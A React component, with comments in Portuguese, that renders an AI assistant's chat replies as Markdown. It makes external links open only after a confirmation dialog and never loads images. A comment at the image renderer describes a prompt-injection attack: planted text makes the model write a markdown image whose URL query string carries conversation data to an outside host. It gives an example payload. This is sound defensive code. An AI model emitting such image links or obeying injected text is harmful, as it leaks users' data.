import { ExternalLink } from "lucide-react"
import { type ReactNode, useState, useSyncExternalStore } from "react"
import type { Components } from "react-markdown"
import ReactMarkdown from "react-markdown"
import remarkBreaks from "remark-breaks"
import remarkGfm from "remark-gfm"
import {
	AlertDialog,
	AlertDialogAction,
	AlertDialogCancel,
	AlertDialogContent,
	AlertDialogDescription,
	AlertDialogFooter,
	AlertDialogHeader,
	AlertDialogTitle,
	AlertDialogTrigger,
} from "@/components/ui/alert-dialog"
import { classifyChatLink, shownUrl } from "@/lib/chat-links"
import { cn } from "@/lib/cn"

const LINK_CLASS = "underline opacity-80 hover:opacity-100"

const noSubscription = () => () => {}

/**
 * Origin do app, só depois da hidratação: no servidor e na hidratação vale `undefined` (link
 * absoluto conta como externo dos dois lados, sem divergência de HTML) e no cliente, em seguida, o
 * origin real, que devolve o link absoluto do próprio app ao caminho interno.
 */
function useAppOrigin(): string | undefined {
	return useSyncExternalStore(
		noSubscription,
		() => window.location.origin,
		() => undefined
	)
}

/**
 * Link escrito pelo modelo. Interno (o próprio sisub) abre normal. Externo mostra o domínio ao
 * lado do texto e só abre depois de confirmar, num aviso com o endereço completo: o texto do
 * link é do modelo e pode mentir, e a query string pode levar o que a conversa leu. Sem `href`
 * no DOM, de propósito: clique do meio e "abrir em nova aba" pulariam a confirmação.
 */
function ChatLink({ href, children }: { href: unknown; children: ReactNode }) {
	const [open, setOpen] = useState(false)
	const target = classifyChatLink(href, useAppOrigin())

	if (target.kind === "blocked") return <span>{children}</span>
	if (target.kind === "internal") {
		return (
			<a href={target.href} target="_blank" rel="noopener noreferrer nofollow" className={LINK_CLASS}>
				{children}
			</a>
		)
	}

	return (
		<AlertDialog open={open} onOpenChange={setOpen}>
			<AlertDialogTrigger render={<button type="button" className={cn(LINK_CLASS, "inline cursor-pointer text-left")} />}>
				{children}
				<span className="ml-1 inline-flex items-center gap-0.5 text-xs no-underline opacity-70">
					<ExternalLink aria-hidden className="size-3" />
					{target.host}
				</span>
			</AlertDialogTrigger>
			<AlertDialogContent>
				<AlertDialogHeader>
					<AlertDialogTitle>Abrir link externo?</AlertDialogTitle>
					<AlertDialogDescription>
						O link sai do sisub e leva para <strong className="text-foreground">{target.host}</strong>. Ele foi escrito pelo assistente; abra só se reconhecer o
						endereço.
					</AlertDialogDescription>
				</AlertDialogHeader>
				<code className="block max-h-32 overflow-auto rounded-md bg-muted p-2 font-mono text-xs break-all">{shownUrl(target.href)}</code>
				<AlertDialogFooter>
					<AlertDialogCancel>Cancelar</AlertDialogCancel>
					<AlertDialogAction
						onClick={() => {
							setOpen(false)
							window.open(target.href, "_blank", "noopener,noreferrer")
						}}
					>
						Abrir
					</AlertDialogAction>
				</AlertDialogFooter>
			</AlertDialogContent>
		</AlertDialog>
	)
}

// Stable references outside — React Compiler won't hoist these automatically
// since they're object/array literals; keeping them module-level prevents
// ReactMarkdown from re-parsing on every render.
const remarkPlugins = [remarkGfm, remarkBreaks]

const components: Partial<Components> = {
	p: ({ children }) => <p className="mb-1 last:mb-0">{children}</p>,

	// pre wraps block code — style the container here
	pre: ({ children }) => <pre className="mt-2 overflow-auto rounded-md bg-black/10 p-3 font-mono text-xs">{children}</pre>,

	// code: block code has className="language-xxx" (set by remark);
	// inline code has no className. react-markdown v10 no longer passes `inline` prop.
	code: ({ className, children }) => {
		if (className) {
			// Block code inside <pre> — pre handles the background, code just carries the language class
			return <code className={cn("font-mono text-xs", className)}>{children}</code>
		}
		// Inline code
		return <code className="rounded bg-black/10 px-1 py-0.5 font-mono text-xs">{children}</code>
	},

	a: ({ href, children }) => <ChatLink href={href}>{children}</ChatLink>,

	// Imagem NUNCA é buscada. O texto aqui vem de um modelo, e um modelo sob prompt injection
	// (texto plantado numa receita, num nome de template) escreve `![](https://x/?d=<dados>)`:
	// o navegador faria o GET sozinho, sem clique, levando na query string o que a conversa
	// tiver lido. Vira link com o texto alternativo, pela mesma regra dos links: externo mostra o
	// domínio e pede confirmação.
	img: ({ src, alt }) => {
		const label = alt?.trim() ? `imagem: ${alt.trim()}` : "imagem"
		if (typeof src !== "string" || !/^https?:\/\//i.test(src)) return <span className="opacity-70">[{label}]</span>
		return <ChatLink href={src}>[{label}]</ChatLink>
	},

	ul: ({ children }) => <ul className="mb-1 list-disc pl-5 last:mb-0">{children}</ul>,
	ol: ({ children }) => <ol className="mb-1 list-decimal pl-5 last:mb-0">{children}</ol>,
	li: ({ children }) => <li className="mb-0.5 last:mb-0">{children}</li>,

	blockquote: ({ children }) => <blockquote className="my-1 border-l-2 border-current/40 pl-3 opacity-70">{children}</blockquote>,

	// GFM tables
	table: ({ children }) => (
		<div className="my-2 overflow-auto">
			<table className="w-full border-collapse text-xs">{children}</table>
		</div>
	),
	th: ({ children }) => <th className="border border-black/20 bg-black/10 px-2 py-1 text-left font-medium">{children}</th>,
	td: ({ children }) => <td className="border border-black/20 px-2 py-1">{children}</td>,
}

interface ChatMarkdownProps {
	children: string
}

export function ChatMarkdown({ children }: ChatMarkdownProps) {
	return (
		<ReactMarkdown remarkPlugins={remarkPlugins} components={components}>
			{children}
		</ReactMarkdown>
	)
}
